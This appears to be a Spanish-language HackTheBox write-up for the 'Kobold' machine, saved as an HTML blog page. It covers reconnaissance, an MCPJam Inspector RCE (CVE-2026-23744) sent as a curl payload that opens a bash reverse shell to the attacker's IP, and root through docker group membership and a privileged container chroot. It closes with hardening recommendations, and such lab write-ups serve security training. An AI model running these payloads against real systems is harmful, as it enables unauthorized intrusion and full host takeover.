@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Kobold</title>
+
+  <meta name="description" content="Resolución de la máquina Kobold de la plataforma de HackTheBox">
+  <meta name="author" content="s1egfr1ed">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Kobold">
+  <meta name="twitter:description" content="Resolución de la máquina Kobold de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="s1egfr1ed">  
+  <meta name="twitter:image" content="/images/hackthebox/kobold.png" />
+
+  <meta property="og:site_name" content="s1egfr1ed" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Kobold">
+  <meta property="og:description" content="Resolución de la máquina Kobold de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/kobold.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/kobold.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Kobold" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="s1egfr1ed">
+          <h1 class="panel-cover__title panel-title scale-up-center">s1egfr1ed</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top"><strong>Pentesting y</strong> <strong>Desarrollo de Malware</strong></p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hackthebox" title="s1egfr1ed" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/z1egfr1ed" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/marshelaillon" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/zygfr1ed" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://x.com/z1egfr1ed" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@s1egfr1ed" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:marshel.aillon@gmail.com" title="Correo Electrónico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#key-findings">Key Findings</a></li>
+        <li><a href="#learning-objectives">Key Learning Objectives</a></li>
+        <li><a href="#reconnaissance">Reconnaissance & Enumeration</a></li>
+        <li><a href="#subdomain-enum">Subdomain Enumeration</a></li>
+        <li><a href="#version-discovery">MCPJam Version Discovery</a></li>
+        <li><a href="#vulnerability">Vulnerability Identification</a></li>
+        <li><a href="#exploitation">RCE Exploitation - CVE-2026-23744</a></li>
+        <li><a href="#system-enum">System Enumeration</a></li>
+        <li><a href="#docker-discovery">Docker Discovery</a></li>
+        <li><a href="#group-membership">Hidden Group Membership</a></li>
+        <li><a href="#docker-privesc">Docker Privilege Escalation</a></li>
+        <li><a href="#capabilities">Container Capabilities Analysis</a></li>
+        <li><a href="#root-access">Root Access Achievement</a></li>
+        <li><a href="#recommendations">Recommendations</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/kobold.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Kobold</h2><br>
+  </header>
+  
+<section class="post" id="key-findings">
+<br><h3 class="post-title">Key Findings</h3><br>
+
+<p class="plain-text">Durante el análisis de seguridad de la máquina Kobold se identificaron las siguientes vulnerabilidades críticas:</p>
+
+<ul class="plain-text">
+  <li>MCPJam Inspector v1.4.2 vulnerable a ejecución remota de código (CVE-2026-23744)</li>
+  <li>Version disclosure mediante Sentry Release ID en código JavaScript</li>
+  <li>Membresía oculta en grupo docker vía /etc/gshadow</li>
+  <li>Usuario con acceso al socket de Docker sin restricciones</li>
+  <li>Contenedores Docker ejecutándose con privilegios elevados</li>
+  <li>Montaje del filesystem del host en contenedores Docker</li>
+  <li>Diferencias en capabilities entre imágenes Docker (mysql vs privatebin)</li>
+  <li>Escalada de privilegios mediante Docker privileged containers y chroot</li>
+</ul>
+
+</section>
+
+<section class="post" id="learning-objectives">
+<br><h3 class="post-title">Key Learning Objectives</h3><br>
+
+<p class="plain-text">Los objetivos de aprendizaje clave en esta máquina incluyen:</p>
+
+<ul class="plain-text">
+  <li>✅ Port Scanning & Service Enumeration</li>
+  <li>✅ Virtual Host Discovery with Gobuster</li>
+  <li>✅ Version Discovery via Sentry Release Tracking</li>
+  <li>✅ GitHub Commit Analysis for Version Identification</li>
+  <li>✅ MCPJam RCE Exploitation - CVE-2026-23744</li>
+  <li>✅ Linux Group Membership Analysis (/etc/group vs /etc/gshadow)</li>
+  <li>✅ Docker Socket Exploitation</li>
+  <li>✅ Container Capabilities Analysis</li>
+  <li>✅ Docker Privileged Container Escape</li>
+</ul>
+
+</section>
+
+<section class="post" id="reconnaissance">
+<br><h3 class="post-title">Reconnaissance & Enumeration</h3><br>
+
+<p class="plain-text">El reconocimiento inicial se realizó utilizando Nmap para identificar puertos abiertos y servicios en ejecución.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-p- --open -n -Pn -vvv -oG ports --min-rate=2500 10.129.19.102
+
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.129.19.102 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///, 3552/open/tcp//taserver///
+</span></code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-p 22,80,443,3552 -sCV -oN services 10.129.19.102
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+3552/tcp open  http     Golang net/http server
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Resultados:</strong></p>
+<ul class="plain-text">
+  <li>Puerto 22/tcp: OpenSSH 9.6p1 Ubuntu</li>
+  <li>Puerto 80/tcp: nginx 1.24.0 con redirección a https://kobold.htb/</li>
+  <li>Puerto 443/tcp: nginx 1.24.0 (SSL) con wildcard certificate (*.kobold.htb)</li>
+  <li>Puerto 3552/tcp: Golang net/http server</li>
+</ul>
+
+<p class="plain-text">Agregamos el dominio al archivo hosts:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'10.129.19.102 kobold.htb'</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="subdomain-enum">
+<br><h3 class="post-title">Subdomain Enumeration</h3><br>
+
+<p class="plain-text">Dado que el certificado SSL indica la presencia de subdominios (*.kobold.htb), realizamos enumeración de virtual hosts:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gobuster vhost </span><span class="p">-u https://kobold.htb \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -t 50 -k --append-domain
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Subdominios encontrados:</p>
+<ul class="plain-text">
+  <li>mcp.kobold.htb</li>
+  <li>bin.kobold.htb</li>
+</ul>
+
+<p class="plain-text">Agregamos los subdominios al archivo hosts:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'10.129.19.102 kobold.htb mcp.kobold.htb bin.kobold.htb'</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> /etc/hosts</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="version-discovery">
+<br><h3 class="post-title">MCPJam Version Discovery</h3><br>
+
+<p class="plain-text">Al analizar <code class="language-plaintext highlighter-rouge">mcp.kobold.htb</code> con Wappalyzer, identificamos que está utilizando <strong>Sentry</strong> para tracking de errores.</p>
+
+<p class="plain-text">Abrimos las herramientas de desarrollador (Network tab), recargamos la página y buscamos por la keyword "sentry". Encontramos el release ID en el código JavaScript:</p>
+
+<a href="/hackthebox/kobold/screenshots/kobold-01.png" target="_blank"><div><p><img src="/hackthebox/kobold/screenshots/kobold-01.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SENTRY_RELEASE={id:"af9cf6a62f550e986fe330c09b8a3b8b83136df6"}
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Utilizamos este commit ID para identificar la versión exacta consultando la API de GitHub:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"https://api.github.com/repos/MCPJam/inspector/commits/af9cf6a62f550e986fe330c09b8a3b8b83136df6"</span><span class="p"> | \
+  </span><span class="ve">python3 </span><span class="p">-m json.tool | </span><span class="ve">grep </span><span class="p">-E </span><span class="am">"message|date"</span><span class="p">
+
+</span><span class="am">"date"</span><span class="p">: </span><span class="am">"2026-01-08T02:08:16Z"</span><span class="p">
+</span><span class="am">"message"</span><span class="p">: </span><span class="am">"v1.4.2"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Versión identificada: <strong>MCPJam Inspector v1.4.2</strong></p>
+
+</section>
+
+<section class="post" id="vulnerability">
+<br><h3 class="post-title">Vulnerability Identification</h3><br>
+
+<p class="plain-text">Investigando esta versión específica de MCPJam Inspector, encontramos que es vulnerable a <strong>CVE-2026-23744</strong>, una vulnerabilidad de ejecución remota de código.</p>
+
+<p class="plain-text">Referencia: <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6" target="_blank">https://github.com/advisories/GHSA-232v-j27c-5pp6</a></p>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">RCE Exploitation - CVE-2026-23744</h3><br>
+
+<p class="plain-text">Preparamos un listener para recibir la reverse shell:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nc </span><span class="p">-lvp 4444</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el exploit enviando un payload malicioso al endpoint de MCP:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-k https://mcp.kobold.htb/api/mcp/connect \
+  -H </span><span class="am">"Content-Type: application/json"</span><span class="p"> \
+  -d </span><span class="am">'{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.16.138/4444 0>&1"],"env":{}},"serverId":"pwned"}'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Obtenemos acceso exitoso al sistema como usuario <code class="language-plaintext highlighter-rouge">ben</code>:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ </span><span class="am">whoami</span><span class="p">
+ben
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="system-enum">
+<br><h3 class="post-title">System Enumeration</h3><br>
+
+<p class="plain-text">Ejecutamos Linpeas para enumerar posibles vectores de escalada de privilegios:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">./linpeas.sh </span><span class="p">&> linpeas_full_output.txt
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Durante la enumeración, encontramos evidencia de contenedores Docker en el sistema al revisar archivos package.json y procesos en ejecución.</p>
+
+</section>
+
+<section class="post" id="docker-discovery">
+<br><h3 class="post-title">Docker Discovery</h3><br>
+
+<p class="plain-text">Confirmamos que Docker está ejecutándose como root:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">ps aux </span><span class="p">| </span><span class="ve">grep </span><span class="p">dockerd
+root        1614  0.1  2.0 2193300 81248 ?       Ssl  Mar31   0:21 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Verificamos la red Docker:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">ifconfig</span><span class="p">
+docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo, al intentar listar contenedores e imágenes, obtenemos errores de permisos:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker ps </span><span class="p">-a
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock
+
+ben@kobold:~$ </span><span class="am">docker images</span><span class="p">
+permission denied while trying to connect to the Docker daemon socket
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="group-membership">
+<br><h3 class="post-title">Hidden Group Membership</h3><br>
+
+<p class="plain-text">Verificamos los grupos del usuario:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">id</span><span class="p">
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+ben@kobold:~$ </span><span class="ve">grep </span><span class="p">docker /etc/group
+docker:x:111:alice
+</span></code></pre></div></div><br>
+
+<p class="plain-text">Aparentemente, <code class="language-plaintext highlighter-rouge">ben</code> no es miembro del grupo docker según <code class="language-plaintext highlighter-rouge">/etc/group</code>. Sin embargo, ejecutamos <code class="language-plaintext highlighter-rouge">newgrp docker</code>:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">newgrp docker</span><span class="p">
+ben@kobold:~$ </span><span class="am">id</span><span class="p">
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Explicación:</strong> La membresía de grupos en Linux se gestiona en dos archivos:</p>
+<ul class="plain-text">
+  <li><code class="language-plaintext highlighter-rouge">/etc/group</code> - legible por cualquier usuario, aquí docker solo listaba a alice</li>
+  <li><code class="language-plaintext highlighter-rouge">/etc/gshadow</code> - legible solo por root, aquí ben sí estaba listado como miembro</li>
+</ul>
+
+<p class="plain-text">Cuando ejecutamos <code class="language-plaintext highlighter-rouge">newgrp docker</code>, el binario (que tiene el bit setuid y corre como root) consulta <code class="language-plaintext highlighter-rouge">/etc/gshadow</code>, encuentra a ben como miembro legítimo y lanza un nuevo shell con el grupo docker activo.</p>
+
+<p class="plain-text">Ahora podemos listar contenedores e imágenes:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker ps </span><span class="p">-a
+CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS       PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   6 weeks ago   Up 3 hours   127.0.0.1:8080->8080/tcp   bin
+
+ben@kobold:~$ </span><span class="am">docker images</span><span class="p">
+REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
+mysql                         latest    f66b7a288113   7 weeks ago    922MB
+privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="docker-privesc">
+<br><h3 class="post-title">Docker Privilege Escalation</h3><br>
+
+<p class="plain-text">Tenemos dos imágenes disponibles. Intentamos la escalada con ambas para entender las diferencias en capabilities.</p>
+
+<p class="plain-text"><strong>Método de escalada:</strong></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker run </span><span class="p">--rm --privileged -v /:/host-root -it mysql:latest chroot /host-root /bin/bash
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Explicación del comando:</strong></p>
+<ul class="plain-text">
+  <li><code class="language-plaintext highlighter-rouge">docker run</code> - Crea y ejecuta un contenedor nuevo</li>
+  <li><code class="language-plaintext highlighter-rouge">--rm</code> - Elimina el contenedor automáticamente al salir (sin rastro)</li>
+  <li><code class="language-plaintext highlighter-rouge">--privileged</code> - Otorga todas las capabilities al contenedor</li>
+  <li><code class="language-plaintext highlighter-rouge">-v /:/host-root</code> - Monta el filesystem raíz del host en /host-root</li>
+  <li><code class="language-plaintext highlighter-rouge">-it mysql:latest</code> - Usa la imagen mysql en modo interactivo</li>
+  <li><code class="language-plaintext highlighter-rouge">chroot /host-root /bin/bash</code> - Cambia el directorio raíz al filesystem del host</li>
+</ul>
+
+</section>
+
+<section class="post" id="capabilities">
+<br><h3 class="post-title">Container Capabilities Analysis</h3><br>
+
+<p class="plain-text"><strong>¿Por qué funciona con mysql pero no con privatebin?</strong></p>
+
+<p class="plain-text">Cuando ejecutamos un contenedor con <code class="language-plaintext highlighter-rouge">--privileged</code>, Docker otorga todas las capabilities. Sin embargo, cada imagen puede dropear esas capabilities en su entrypoint.</p>
+
+<p class="plain-text">Verificamos las capabilities de ambas imágenes:</p>
+
+<p class="plain-text"><strong>mysql:latest - MANTIENE todas las capabilities:</strong></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker run </span><span class="p">--rm --privileged -it mysql:latest cat /proc/self/status | </span><span class="ve">grep </span><span class="p">Cap
+
+CapInh: 0000000000000000
+CapPrm: 000001ffffffffff  ← ¡Tiene TODAS las capabilities!
+CapEff: 000001ffffffffff  ← ¡Todas activas!
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>privatebin/nginx-fpm-alpine - DROPEA todas las capabilities:</strong></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker run </span><span class="p">--rm --privileged -it --entrypoint /bin/cat privatebin/nginx-fpm-alpine:2.0.2 /proc/self/status | </span><span class="ve">grep </span><span class="p">Cap
+
+CapInh: 0000000000000000
+CapPrm: 0000000000000000  ← ¡Ninguna!
+CapEff: 0000000000000000  ← ¡Ninguna activa!
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+</span></code></pre></div></div><br>
+
+<p class="plain-text">El problema es que <code class="language-plaintext highlighter-rouge">chroot</code> requiere específicamente la capability <code class="language-plaintext highlighter-rouge">CAP_SYS_CHROOT</code>. Con privatebin esa capability fue dropeada en su entrypoint, por eso obtenemos <code class="language-plaintext highlighter-rouge">chroot: operation not permitted</code>.</p>
+
+<p class="plain-text"><strong>Lección aprendida:</strong> <code class="language-plaintext highlighter-rouge">--privileged</code> es condición necesaria pero no suficiente. También importa que la imagen no dropee capabilities en su entrypoint.</p>
+
+</section>
+
+<section class="post" id="root-access">
+<br><h3 class="post-title">Root Access Achievement</h3><br>
+
+<p class="plain-text">Ejecutamos el contenedor privilegiado con la imagen mysql y obtenemos root:</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ben@kobold:~$ </span><span class="am">docker run </span><span class="p">--rm --privileged -v /:/host-root -it mysql:latest chroot /host-root /bin/bash
+
+root@container:/# </span><span class="am">whoami</span><span class="p">
+root
+
+root@container:/# </span><span class="am">cat </span><span class="p">/root/root.txt
+</span></code></pre></div></div><br>
+
+<p class="plain-text"><strong>Cadena lógica de la explotación:</strong></p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Ser miembro del grupo docker
+        ↓
+Podemos escribir en /var/run/docker.sock
+        ↓
+Podemos hablarle al daemon dockerd (que corre como root)
+        ↓
+Le pedimos crear un contenedor con --privileged
+        ↓
+El contenedor tiene acceso total al disco del host via -v /:/host-root
+        ↓
+chroot cambia nuestra raíz al disco del host
+        ↓
+root
+</span></code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="recommendations">
+<br><h3 class="post-title">Recommendations</h3><br>
+
+<br><h4 class="post-title">Immediate Actions</h4><br>
+
+<p class="plain-text"><strong>1. MCPJam Inspector Security</strong></p>
+<ul class="plain-text">
+  <li>Actualizar MCPJam Inspector a la última versión disponible</li>
+  <li>Aplicar parches de seguridad para CVE-2026-23744</li>
+  <li>Implementar validación estricta de entrada en endpoints de API</li>
+  <li>Deshabilitar Sentry release tracking en producción o usar IDs ofuscados</li>
+</ul>
+
+<p class="plain-text"><strong>2. Docker Group Management</strong></p>
+<ul class="plain-text">
+  <li>Auditar membresías en /etc/gshadow además de /etc/group</li>
+  <li>Eliminar usuarios innecesarios del grupo docker</li>
+  <li>Implementar rootless Docker para servicios no críticos</li>
+  <li>Considerar usar Podman en lugar de Docker para mejor aislamiento</li>
+</ul>
+
+<p class="plain-text"><strong>3. Docker Socket Protection</strong></p>
+<ul class="plain-text">
+  <li>Restringir acceso al socket de Docker (/var/run/docker.sock)</li>
+  <li>Usar Docker socket proxy para limitar comandos permitidos</li>
+  <li>Implementar Docker authorization plugins</li>
+  <li>Auditar regularmente permisos del socket de Docker</li>
+</ul>
+
+<p class="plain-text"><strong>4. Container Security</strong></p>
+<ul class="plain-text">
+  <li>NUNCA usar flag --privileged en producción</li>
+  <li>Evitar montar el filesystem del host (/) en contenedores</li>
+  <li>Implementar AppArmor o SELinux profiles para contenedores</li>
+  <li>Usar user namespaces para mapear UID 0 del contenedor a UID no privilegiado del host</li>
+</ul>
+
+<br><h4 class="post-title">Long-term Security Improvements</h4><br>
+
+<p class="plain-text"><strong>1. Access Controls</strong></p>
+<ul class="plain-text">
+  <li>Implementar principio de mínimo privilegio en membresías de grupos</li>
+  <li>Regular auditoría de /etc/group y /etc/gshadow</li>
+  <li>Implementar RBAC para acceso a Docker</li>
+  <li>Usar herramientas como Falco para detectar comportamientos anómalos</li>
+</ul>
+
+<p class="plain-text"><strong>2. Container Runtime Security</strong></p>
+<ul class="plain-text">
+  <li>Implementar políticas de seguridad con OPA (Open Policy Agent)</li>
+  <li>Usar imágenes base minimal y verificar sus capabilities</li>
+  <li>Implementar escaneo de imágenes con Trivy o Clair</li>
+  <li>Establecer políticas de no ejecutar contenedores como root</li>
+</ul>
+
+<p class="plain-text"><strong>3. Monitoring & Detection</strong></p>
+<ul class="plain-text">
+  <li>Implementar logging de todos los comandos docker ejecutados</li>
+  <li>Alertas para ejecución de contenedores con --privileged</li>
+  <li>Monitorear montajes de directorios sensibles del host</li>
+  <li>Detectar uso de chroot en contenedores</li>
+</ul>
+
+<p class="plain-text"><strong>4. Version Disclosure Prevention</strong></p>
+<ul class="plain-text">
+  <li>No exponer commit IDs o release tags en código JavaScript de producción</li>
+  <li>Configurar Sentry para usar release IDs genéricos</li>
+  <li>Implementar obfuscación de código en producción</li>
+  <li>Regular auditoría de información expuesta en headers y código fuente</li>
+</ul>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2026 - s1egfr1ed</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
